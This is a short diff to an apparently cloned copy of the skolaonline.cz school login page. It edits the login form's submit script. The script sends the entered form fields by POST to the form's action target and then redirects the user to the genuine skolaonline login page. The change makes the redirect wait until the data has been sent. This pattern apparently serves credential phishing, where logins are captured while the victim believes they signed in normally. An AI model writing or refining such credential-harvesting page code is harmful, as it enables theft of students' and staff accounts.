@@ -514,15 +514,13 @@ document.getElementById("prihlaseniForm").addEventListener("submit", function(e)
   }
 
   fetch(form.action, {
-    method: "POST",
-    body: params,
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
-    },
-    mode: "no-cors"  // ignoruje CORS, jen pro odeslání
-  });
-
-  // okamžité přesměrování
+  method: "POST",
+  body: params,
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  }
+}).then(response => {
+  // jen pokud je request úspěšný
   window.location.href = "https://www.skolaonline.cz/prihlaseni/?SOLLogin=pass";
 });
 </script>
@@ -1560,4 +1558,5 @@ Database Caching 4/8 queries in 0.003 seconds using Redis
 
 Served from: www.skolaonline.cz @ 2026-02-26 20:34:05 by W3 Total Cache
 -->
+
 
